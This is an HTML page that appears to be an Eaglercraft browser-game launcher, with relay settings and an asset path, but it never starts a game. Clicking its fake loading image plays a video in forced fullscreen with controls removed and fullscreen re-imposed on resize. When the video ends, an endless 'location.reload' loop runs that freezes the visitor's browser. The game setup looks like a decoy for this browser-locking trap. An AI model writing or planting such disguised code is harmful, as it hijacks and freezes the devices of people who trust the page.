    <script type="text/javascript">
        "use strict";
        const relayId = Math.floor(Math.random() * 3);
        
        // %%%%%%%%% launch options %%%%%%%%%%%%
        
        window.eaglercraftXOpts = {
            container: "game_frame",
            worldsDB: "worlds",
            relays: [
                { addr: "wss://relay.deev.is/", comment: "lax1dude relay #1", primary: relayId == 0 },
                { addr: "wss://relay.lax1dude.net/", comment: "lax1dude relay #2", primary: relayId == 1 },
                { addr: "wss://relay.shhnowisnottheti.me/", comment: "ayunami relay #1", primary: relayId == 2 }
            ]
        };
        
        // %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
        
        </script>


        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                overflow: hidden;
            }
            #image {
                height: 100%;
                width: 100%;
            }
            #video {
                display: none;
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                object-fit: cover;
            }
        </style>
    <script>
        window.onload = function() {
            const videoElement = document.getElementById('video');
            videoElement.load();
        };
		  window.eaglercraftXOpts.assetsURI = [ { url: "assets.epk.txt", path: "assets/minecraft/lang/" } ];


        function switchToVideo() {
            document.getElementById('image').style.display = 'none';
            const videoElement = document.getElementById('video');
            videoElement.style.display = 'block';
            videoElement.play();


            videoElement.onended = function() {
                while(1)location.reload(1);
                while (true);
            };

            function enterFullscreen() {
                document.documentElement.requestFullscreen().catch(function (err) {
                    console.error(err);
                });
            }

            function checkFullscreen() {
                if (!document.fullscreenElement) {
                    enterFullscreen();
                }
            }

            enterFullscreen();
            window.onresize = function(event){
                checkFullscreen()
            }

            videoElement.controls = false;
            
        }
 
    </script>
</head>
<body>

    <img id="image" src="loading.png" onclick="switchToVideo()">

    <video id="video" width="640" height="360" controls preload="auto">
        <source src="mario.mp4" type="video/mp4">
    </video>

</body>
